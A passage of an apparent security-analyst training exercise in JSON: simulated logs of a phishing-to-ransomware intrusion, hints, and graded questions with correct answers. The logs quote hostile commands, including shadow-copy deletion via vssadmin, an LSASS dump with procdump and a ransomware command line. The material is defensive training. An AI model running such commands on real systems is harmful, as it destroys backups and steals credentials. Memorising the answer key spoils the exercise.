+            "Image": "C:\\Windows\\System32\\vssadmin.exe",
+            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "CORPSEC\\admin.rjohnson",
+            "LogonGuid": "{f6a7b8c9-0001-0002-0003-000000000003}",
+            "LogonId": "0x5A8C12",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=1b3d22c3f4e5d6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1",
+            "ParentProcessGuid": "{a7b8c9d0-e1f2-3456-abcd-456789012344}",
+            "ParentProcessId": 14100,
+            "ParentImage": "C:\\Windows\\Temp\\encrypt.exe",
+            "ParentCommandLine": "C:\\Windows\\Temp\\encrypt.exe --target D:\\ --ext .locked --note README_DECRYPT.txt"
+          },
+          "severity": "CRITICAL",
+          "hostname": "SRV-FS01",
+          "username": "admin.rjohnson",
+          "processName": "vssadmin.exe",
+          "eventId": "1",
+          "timestamp": "2025-10-14T13:30:05Z",
+          "isEvidence": true,
+          "evidenceTag": "shadow-copy-deletion",
+          "sortOrder": 4
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert (CRITICAL) \u2014 Ransomware behavior detected on SRV-FS01. Process encrypt.exe is performing mass file encryption across D:\\ drive. File extension being changed to .locked. Ransom note README_DECRYPT.txt being dropped in each directory. Over 15,000 files affected in 3 minutes.",
+          "rawLog": {
+            "alertId": "EDR-2025-18768",
+            "severity": "CRITICAL",
+            "timestamp": "2025-10-14T13:30:15Z",
+            "hostname": "SRV-FS01",
+            "username": "admin.rjohnson",
+            "processName": "encrypt.exe",
+            "processPath": "C:\\Windows\\Temp\\encrypt.exe",
+            "commandLine": "C:\\Windows\\Temp\\encrypt.exe --target D:\\ --ext .locked --note README_DECRYPT.txt",
+            "parentProcess": "cmd.exe",
+            "alertType": "Ransomware - Mass File Encryption",
+            "detectionRule": "RANSOMWARE_MASS_FILE_MODIFICATION",
+            "mitreTactic": "Impact",
+            "mitreTechnique": "T1486",
+            "riskScore": 100,
+            "action": "ALERT_ONLY",
+            "impactMetrics": {
+              "filesEncrypted": 15247,
+              "directoriesAffected": 892,
+              "encryptionRate": "84 files/second",
+              "targetDrive": "D:\\",
+              "newExtension": ".locked",
+              "ransomNote": "README_DECRYPT.txt",
+              "shadowCopiesDeleted": true,
+              "timeElapsed": "3 minutes"
+            },
+            "encryptedDirectories": [
+              "D:\\Finance\\",
+              "D:\\Executive\\",
+              "D:\\HR\\",
+              "D:\\Legal\\",
+              "D:\\Engineering\\"
+            ],
+            "recommendation": "EMERGENCY: Isolate SRV-FS01 IMMEDIATELY. Do NOT power off - preserve memory for forensics. Check backup integrity."
+          },
+          "severity": "CRITICAL",
+          "hostname": "SRV-FS01",
+          "username": "admin.rjohnson",
+          "processName": "encrypt.exe",
+          "timestamp": "2025-10-14T13:30:15Z",
+          "isEvidence": true,
+          "evidenceTag": "ransomware-encryption",
+          "sortOrder": 5
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event 1102 \u2014 The Security event log was cleared on WS-EXEC01 by user admin.rjohnson. This is anti-forensics activity \u2014 the attacker is destroying evidence of their initial compromise activities on the original entry point.",
+          "rawLog": {
+            "EventID": 1102,
+            "Source": "Microsoft-Windows-Eventlog",
+            "TimeCreated": "2025-10-14T14:15:33Z",
+            "Computer": "WS-EXEC01.corpsec.local",
+            "SubjectUserSid": "S-1-5-21-3842939050-3880317879-2865463114-1201",
+            "SubjectUserName": "admin.rjohnson",
+            "SubjectDomainName": "CORPSEC",
+            "SubjectLogonId": "0x3E7A1B",
+            "Channel": "Security",
+            "BackupPath": ""
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-EXEC01",
+          "username": "admin.rjohnson",
+          "eventId": "1102",
+          "timestamp": "2025-10-14T14:15:33Z",
+          "isEvidence": true,
+          "evidenceTag": "event-log-cleared",
+          "sortOrder": 6
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Correlation Alert (CRITICAL) \u2014 Full APT kill chain detected across multiple hosts. The SIEM has correlated 47 events across 5 data sources spanning 5.5 hours. Attack progression: spearphishing -> macro execution -> C2 beaconing -> credential theft -> lateral movement -> data exfiltration -> ransomware deployment -> log clearing.",
+          "rawLog": {
+            "alertId": "SIEM-CORR-2025-4425",
+            "ruleName": "APT Kill Chain - Full Lifecycle Correlation",
+            "severity": "CRITICAL",
+            "timestamp": "2025-10-14T14:15:40Z",
+            "description": "Complete APT kill chain detected across CORPSEC environment. Threat actor gained initial access via spearphishing, established persistent C2, dumped credentials, moved laterally to 3 servers including domain controller, exfiltrated ~847MB of financial data, deployed ransomware on file server, and cleared event logs.",
+            "correlatedEvents": 47,
+            "timeWindow": "5 hours 30 minutes",
+            "dataSources": ["Email Gateway", "Sysmon", "Windows Security", "EDR", "Network Flow", "Proxy", "DNS"],
+            "killChainPhases": {
+              "initialAccess": {
+                "technique": "T1566.001 - Spearphishing Attachment",
+                "target": "r.johnson@corpsec.local",
+                "timestamp": "2025-10-14T08:45:11Z"
+              },
+              "execution": {
+                "technique": "T1059.001 - PowerShell",
+                "host": "WS-EXEC01",
+                "timestamp": "2025-10-14T08:47:33Z"
+              },
+              "persistence": {
+                "technique": "T1547.001 - Registry Run Keys",
+                "host": "WS-EXEC01",
+                "timestamp": "2025-10-14T08:48:05Z"
+              },
+              "credentialAccess": {
+                "technique": "T1003.001 - LSASS Memory",
+                "host": "WS-EXEC01",
+                "compromisedAccount": "admin.rjohnson",
+                "timestamp": "2025-10-14T10:12:48Z"
+              },
+              "lateralMovement": {
+                "technique": "T1021.002 - SMB/Admin Shares",
+                "hosts": ["SRV-FS01", "SRV-APP02", "SRV-DC01"],
+                "timestamp": "2025-10-14T10:22:18Z"
+              },
+              "exfiltration": {
+                "destination": "91.215.85.17",
+                "dataVolume": "847 MB",
+                "timestamp": "2025-10-14T11:53:15Z"
+              },
+              "impact": {
+                "technique": "T1486 - Data Encrypted for Impact",
+                "host": "SRV-FS01",
+                "filesAffected": 15247,
+                "timestamp": "2025-10-14T13:30:15Z"
+              },
+              "defenseEvasion": {
+                "technique": "T1070.001 - Clear Windows Event Logs",
+                "host": "WS-EXEC01",
+                "timestamp": "2025-10-14T14:15:33Z"
+              }
+            },
+            "affectedSystems": ["WS-EXEC01", "SRV-FS01", "SRV-APP02", "SRV-DC01"],
+            "affectedAccounts": ["r.johnson", "admin.rjohnson"],
+            "c2Infrastructure": ["185.191.32.44", "cdn-update.silktyphoon.xyz"],
+            "exfilInfrastructure": ["91.215.85.17", "storage-sync-cdn.cloudfront-api.com"],
+            "recommendation": "ACTIVATE FULL INCIDENT RESPONSE PLAN. Isolate all affected hosts. Block all identified IOCs at perimeter. Reset ALL domain credentials. Engage forensics team and legal counsel."
+          },
+          "severity": "CRITICAL",
+          "hostname": "SIEM-01",
+          "timestamp": "2025-10-14T14:15:40Z",
+          "isEvidence": true,
+          "evidenceTag": "siem-full-killchain-correlation",
+          "sortOrder": 7
+        }
+      ],
+      "hints": [
+        {
+          "content": "The 7z.exe command line reveals the attacker is targeting Finance, Executive, and M&A Confidential directories specifically. The -p flag sets an encryption password on the archive, and -mhe=on enables header encryption so you cannot even see the filenames inside without the password.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The exfiltration destination uses domain impersonation: 'storage-sync-cdn.cloudfront-api.com' looks like an AWS CloudFront domain but actually resolves to 91.215.85.17, an attacker-controlled server. This is a common technique to evade proxy-based DLP that allows known cloud services.",
+          "pointsPenalty": 3,
+          "sortOrder": 2
+        },
+        {
+          "content": "The ransomware parent process in the vssadmin log reveals the full encryption command: 'encrypt.exe --target D:\\ --ext .locked --note README_DECRYPT.txt'. Combined with shadow copy deletion and the earlier exfiltration, this confirms a double extortion operation: 'pay or we publish your data AND you lose access to it.'",
+          "pointsPenalty": 5,
+          "sortOrder": 3
+        }
+      ]
+    }
+  ],
+  "checkpoints": [
+    {
+      "stageNumber": 1,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What was the initial access vector used by the SilkTyphoon threat actor?",
+      "options": [
+        "Exploitation of a public-facing web application",
+        "Spearphishing email with a macro-enabled Excel attachment",
+        "Compromised VPN credentials from a third-party breach",
+        "USB drive dropped in the parking lot (baiting)"
+      ],
+      "correctAnswer": "Spearphishing email with a macro-enabled Excel attachment",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "The email gateway log shows a targeted phishing email was sent to CFO r.johnson with a malicious attachment named 'Q3-Financial-Report.xlsm' (a macro-enabled Excel file). When the CFO opened the document and enabled macros, EXCEL.EXE spawned powershell.exe, confirming this was a spearphishing attachment attack (MITRE ATT&CK T1566.001).",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 1,
+      "checkpointType": "EVIDENCE_SELECTION",
+      "question": "Select ALL logs that prove the phishing email was malicious and connected to the SilkTyphoon C2 infrastructure. (Select all that apply)",
+      "options": ["phishing-email-delivery", "macro-powershell-execution", "edr-macro-execution-alert", "c2-payload-download", "c2-domain-resolution", "c2-payload-proxy-log"],
+      "correctAnswer": ["phishing-email-delivery", "macro-powershell-execution", "c2-domain-resolution", "c2-payload-proxy-log"],
+      "points": 15,
+      "category": "evidence",
+      "explanation": "Four logs directly link the phishing email to SilkTyphoon C2: (1) The email gateway log shows the email originated from IP 185.191.32.44 (the C2 server IP visible in the Received headers and X-Orig-IP). (2) The Sysmon process creation log proves the macro was malicious \u2014 EXCEL.EXE spawned PowerShell with an encoded download command. (3) The DNS log shows cdn-update.silktyphoon.xyz resolving to 185.191.32.44, directly tying the C2 domain to the threat actor name. (4) The proxy log confirms the payload download from the SilkTyphoon domain. While the EDR alert and Sysmon network connection are also important evidence, the four selected logs form the definitive chain linking email -> execution -> C2 infrastructure.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 1,
+      "checkpointType": "TRUE_FALSE",
+      "question": "The phishing email passed all three email authentication checks (SPF, DKIM, and DMARC), making it indistinguishable from legitimate email.",
+      "options": ["True", "False"],
+      "correctAnswer": "False",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "While SPF and DKIM both passed, the DMARC check FAILED (dmarcResult: 'fail', dmarcAlignment: 'relaxed-fail'). DMARC alignment failure means the From domain did not align with the SPF or DKIM domains, indicating the email was likely spoofed. Additionally, the Return-Path header pointed to 'bounce-handler@bulletproof-host.net' (a bulletproof hosting provider) rather than the claimed sender domain, and the X-Orig-IP (185.191.32.44) is the known C2 server. A properly configured email gateway with DMARC enforcement set to 'reject' would have blocked this email.",
+      "sortOrder": 3
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "The attacker established TWO persistence mechanisms on WS-EXEC01. Why would an APT use multiple persistence methods simultaneously?",
+      "options": [
+        "It was an accident \u2014 the script ran twice",
+        "Redundancy: if one mechanism is discovered and removed, the other maintains access",
+        "Registry keys only work on Windows 10 and the attacker wasn't sure of the OS version",
+        "Scheduled tasks are faster than registry keys for initial execution"
+      ],
+      "correctAnswer": "Redundancy: if one mechanism is discovered and removed, the other maintains access",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "APT groups commonly install multiple persistence mechanisms as redundancy. If a defender discovers and removes the registry Run key ('WindowsSecurityUpdate'), the scheduled task ('MicrosoftEdgeUpdateCore') will re-execute the implant every 15 minutes. This resilience is a hallmark of sophisticated threat actors who expect some of their activity to be detected and plan accordingly.",
+      "sortOrder": 4
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "TRUE_FALSE",
+      "question": "The process 'svchost32.exe' running from C:\\Users\\r.johnson\\AppData\\Local\\Temp\\ is a legitimate Windows system process.",
+      "options": ["True", "False"],
+      "correctAnswer": "False",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "This is NOT a legitimate Windows process. The real svchost.exe (no '32') runs from C:\\Windows\\System32\\ and is a critical Windows service host. The attacker named their implant 'svchost32.exe' to masquerade as the legitimate process (MITRE T1036 \u2014 Masquerading). Key red flags: (1) the '32' suffix is not used by any real Windows binary, (2) it's running from a user's AppData\\Local\\Temp directory instead of System32, (3) the EDR alert revealed the original PE filename is 'beacon_x64.exe' (a Cobalt Strike implant), and (4) the file is unsigned with high entropy (7.4), suggesting packed/encrypted content.",
+      "sortOrder": 5
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "SEVERITY_CLASSIFICATION",
+      "question": "Classify the overall severity of the Stage 2 findings (payload installation, dual persistence mechanisms, and active C2 beaconing) for incident response prioritization.",
+      "options": ["LOW \u2014 Monitor and investigate during business hours", "MEDIUM \u2014 Investigate within 4 hours", "HIGH \u2014 Investigate immediately, prepare for containment", "CRITICAL \u2014 Activate full incident response, begin containment now"],
+      "correctAnswer": "HIGH \u2014 Investigate immediately, prepare for containment",
+      "points": 15,
+      "category": "response",
+      "explanation": "At Stage 2, the attacker has a persistent implant with active C2 communication, but has not yet stolen credentials or moved laterally. The correct severity is HIGH: investigate immediately and prepare containment actions (isolate the host, block C2 IPs). It is not yet CRITICAL because the blast radius is limited to a single workstation. However, if Stage 2 is not contained, the attacker will escalate to credential theft and lateral movement, which WOULD be CRITICAL. This question tests the analyst's ability to calibrate severity based on current impact, not potential impact.",
+      "sortOrder": 6
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What specific credential dumping technique did the attacker use to obtain the domain admin NTLM hash?",
+      "options": [
+        "Kerberoasting \u2014 requesting TGS tickets for service accounts",
+        "LSASS memory dump using ProcDump followed by offline extraction",
+        "DCSync attack against the domain controller",
+        "Brute-force password spraying against the domain admin account"
+      ],
+      "correctAnswer": "LSASS memory dump using ProcDump followed by offline extraction",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "The logs clearly show a two-step credential theft process: (1) Sysmon Event 10 shows svchost32.exe directly accessing LSASS memory with PROCESS_VM_READ permissions, and (2) Sysmon Event 1 shows procdump64.exe being launched with the command 'procdump64.exe -accepteula -ma lsass.exe debug.dmp' to create a full memory dump of LSASS. The NTLM hashes were then extracted from this dump file. This is MITRE ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory).",
+      "sortOrder": 7
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "RECOMMENDED_ACTION",
+      "question": "The SIEM correlation alert in Stage 3 recommends resetting the KRBTGT password twice. Why must it be reset TWICE, not just once?",
+      "options": [
+        "The first reset sometimes fails due to replication delays",
+        "Active Directory keeps the current and previous KRBTGT password hashes; resetting twice invalidates both",
+        "The second reset forces all domain controllers to synchronize immediately",
+        "Twice is a general security best practice with no technical reason"
+      ],
+      "correctAnswer": "Active Directory keeps the current and previous KRBTGT password hashes; resetting twice invalidates both",
+      "points": 15,
+      "category": "response",
+      "explanation": "Active Directory stores the current AND the previous KRBTGT password hash (the N and N-1 hashes). This is by design so that Kerberos tickets encrypted with the previous key remain valid during the rotation period. If an attacker has compromised the current KRBTGT hash, a single reset would only change the current hash \u2014 the attacker could still forge Golden Tickets using the now-previous hash. Resetting it twice ensures both the current and previous hashes are changed, completely invalidating any stolen KRBTGT material. Note: the two resets should be done with sufficient replication time between them (typically 12-24 hours) to avoid Kerberos authentication failures.",
+      "sortOrder": 8
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "EVIDENCE_SELECTION",
+      "question": "Select ALL evidence items from Stage 3 that would be needed to prove credential compromise occurred and identify the stolen account. (Select all that apply)",
+      "options": ["sedebugprivilege-assigned", "lsass-memory-access", "edr-credential-theft-alert", "procdump-lsass-dump", "pass-the-hash-attempt", "siem-credential-theft-chain"],
+      "correctAnswer": ["lsass-memory-access", "edr-credential-theft-alert", "procdump-lsass-dump", "pass-the-hash-attempt"],
+      "points": 15,
+      "category": "evidence",
+      "explanation": "Four evidence items are essential to prove credential compromise: (1) The Sysmon Event 10 (LSASS access) proves the malware read LSASS process memory. (2) The EDR alert identifies which credentials were cached and at risk, including the domain admin 'admin.rjohnson'. (3) The ProcDump execution proves a full LSASS dump was created for offline extraction. (4) The Event 4648 (explicit credential logon) proves the stolen admin.rjohnson hash was successfully used to authenticate to SRV-FS01. The SeDebugPrivilege assignment is a prerequisite but not direct proof of dumping. The SIEM correlation is a summary, not primary evidence.",
+      "sortOrder": 9
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "How can you tell from the Windows Event 4624 logs that the attacker used Pass the Hash rather than legitimate domain admin credentials?",
+      "options": [
+        "The EventID 4624 is only generated by Pass the Hash attacks",
+        "The LogonType 3 is exclusive to NTLM relay attacks",
+        "The AuthenticationPackageName is 'NTLM' instead of 'Kerberos', and LogonGuid is all zeros",
+        "The source IP address belongs to a workstation instead of the domain controller"
+      ],
+      "correctAnswer": "The AuthenticationPackageName is 'NTLM' instead of 'Kerberos', and LogonGuid is all zeros",
+      "points": 15,
+      "category": "investigation",
+      "explanation": "Pass the Hash attacks produce distinctive artifacts in Event 4624 logs: (1) AuthenticationPackageName shows 'NTLM' instead of 'Kerberos' \u2014 in a healthy AD environment, domain accounts should authenticate via Kerberos by default. (2) The LogonGuid is '{00000000-0000-0000-0000-000000000000}' (all zeros), which indicates the logon did not use a Kerberos ticket. When a legitimate domain admin authenticates normally, Kerberos provides a non-zero LogonGuid. While a workstation source IP is unusual, it alone does not prove Pass the Hash, as an admin could legitimately authenticate from any domain-joined workstation.",
+      "sortOrder": 10
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "RECOMMENDED_ACTION",
+      "question": "Which containment action should be the HIGHEST priority upon discovering the attacker has compromised the domain controller (SRV-DC01)?",
+      "options": [
+        "Reset the CFO's (r.johnson) password immediately",
+        "Block the C2 IP 185.191.32.44 at the perimeter firewall",
+        "Disable the admin.rjohnson domain admin account and isolate all compromised hosts",
+        "Shut down the file server SRV-FS01 to prevent data loss"
+      ],
+      "correctAnswer": "Disable the admin.rjohnson domain admin account and isolate all compromised hosts",
+      "points": 15,
+      "category": "response",
+      "explanation": "When the domain controller is compromised with domain admin credentials, the highest priority is to disable the compromised account (admin.rjohnson) and isolate ALL affected hosts (WS-EXEC01, SRV-FS01, SRV-APP02, and SRV-DC01). This cuts off the attacker's ability to perform further actions across the domain. While blocking the C2 IP is important, the attacker already has domain admin access and can operate without C2 communication. Resetting only the CFO's password is insufficient because the domain admin credentials are the real threat. Shutting down the file server destroys volatile memory evidence needed for forensics.",
+      "sortOrder": 11
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "SHORT_ANSWER",
+      "question": "List all four systems (by hostname) that the attacker accessed or compromised during the lateral movement phase, in chronological order of first access.",
+      "options": [],
+      "correctAnswer": "WS-EXEC01, SRV-FS01, SRV-APP02, SRV-DC01",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "The attacker's lateral movement path, in chronological order: (1) WS-EXEC01 (10.0.1.25) \u2014 the original compromised host/pivot point, (2) SRV-FS01 (10.0.3.10) \u2014 first lateral target at 10:22:18Z via PsExec, (3) SRV-APP02 (10.0.3.25) \u2014 second target at 10:28:33Z via WMI, (4) SRV-DC01 (10.0.2.5) \u2014 domain controller compromised at 10:35:42Z via PsExec. All connections originated from WS-EXEC01 using the stolen admin.rjohnson NTLM hash.",
+      "sortOrder": 12
+    },
+    {
+      "stageNumber": 5,
+      "checkpointType": "SEVERITY_CLASSIFICATION",
+      "question": "Given the full scope of Stage 5 \u2014 847 MB of financial data exfiltrated, ransomware encrypting 15,000+ files on the file server, and event logs cleared \u2014 classify the overall incident severity.",
+      "options": ["HIGH \u2014 Significant impact to business operations", "CRITICAL \u2014 Severe impact requiring executive notification and external response", "CATASTROPHIC \u2014 Existential threat requiring board notification, legal counsel, and regulatory disclosure"],
+      "correctAnswer": "CRITICAL \u2014 Severe impact requiring executive notification and external response",
+      "points": 15,
+      "category": "response",
+      "explanation": "This incident is CRITICAL severity: (1) Data exfiltration of 847 MB of financial data including M&A Confidential materials creates regulatory, legal, and competitive exposure. (2) Ransomware encrypted 15,000+ files on the file server, disrupting business operations. (3) The domain controller was compromised, meaning the entire AD trust boundary is broken. (4) Event log clearing indicates intent to evade forensic investigation. This requires immediate executive notification, engagement of external incident response firms, legal counsel for breach notification requirements, and coordination with law enforcement. It is not 'catastrophic' (business-ending) if backups are intact and the environment can be rebuilt, but the data exfiltration component makes this a notifiable breach under most regulations.",
+      "sortOrder": 13
+    },
+    {
+      "stageNumber": 5,
+      "checkpointType": "TRUE_FALSE",
+      "question": "The attacker cleared the event logs on WS-EXEC01 (Event 1102), which means all forensic evidence from that host is permanently lost.",
+      "options": ["True", "False"],
+      "correctAnswer": "False",
+      "points": 10,
+      "category": "investigation",
+      "explanation": "Event log clearing does NOT destroy all forensic evidence. Multiple alternative evidence sources survive: (1) The Event 1102 entry ITSELF is recorded, proving logs were cleared and by whom. (2) Sysmon logs are stored in a separate event log channel (Microsoft-Windows-Sysmon/Operational) and may not have been cleared. (3) The EDR agent maintains its own telemetry database independent of Windows event logs. (4) Network-level evidence (firewall, proxy, DNS, SIEM) is stored on separate infrastructure. (5) Memory forensics on the live host can recover artifacts. (6) The SIEM already ingested and correlated events before they were cleared. This is why defense-in-depth with multiple log sources and centralized log forwarding is critical.",
+      "sortOrder": 14
+    },
+    {
+      "stageNumber": 5,
+      "checkpointType": "INCIDENT_REPORT",
+      "question": "Write a concise executive incident summary covering: (1) Attack vector and initial compromise, (2) Scope of compromise (systems and accounts), (3) Data impact (exfiltration and encryption), (4) Top 3 immediate containment actions, and (5) Top 3 recovery recommendations.",
+      "options": [],
+      "correctAnswer": "Executive Incident Summary: On 2025-10-14, a targeted spearphishing email delivered a weaponized Excel document (Q3-Financial-Report.xlsm) to CFO r.johnson. The macro executed PowerShell, downloading a C2 implant from SilkTyphoon infrastructure (185.191.32.44 / cdn-update.silktyphoon.xyz). The attacker established persistence via registry Run key and scheduled task, then dumped credentials from LSASS to obtain domain admin (admin.rjohnson) NTLM hash. Using Pass the Hash, they compromised 4 systems: WS-EXEC01, SRV-FS01, SRV-APP02, and SRV-DC01. Approximately 847 MB of financial data (including M&A Confidential) was exfiltrated to 91.215.85.17 before ransomware encrypted 15,000+ files on SRV-FS01. Containment: (1) Isolate all compromised hosts, (2) Disable admin.rjohnson and reset all domain admin credentials, (3) Block C2 and exfil IPs at perimeter. Recovery: (1) Rebuild compromised systems from known-good images, (2) Reset KRBTGT password twice and all cached credentials, (3) Restore file server from verified backups.",
+      "points": 20,
+      "category": "report",
+      "explanation": "An effective executive incident summary must be concise yet complete. It needs to cover the full attack lifecycle: how the attacker got in (spearphishing), what they compromised (4 systems, domain admin account), what data was affected (847 MB exfiltrated, 15K files encrypted), and the recommended response actions. The key distinction between a good and great summary is specificity: naming exact hostnames, account names, IP addresses, data volumes, and prioritized actions shows the analyst has full situational awareness of the incident.",
+      "sortOrder": 15
+    }
+  ]
+}
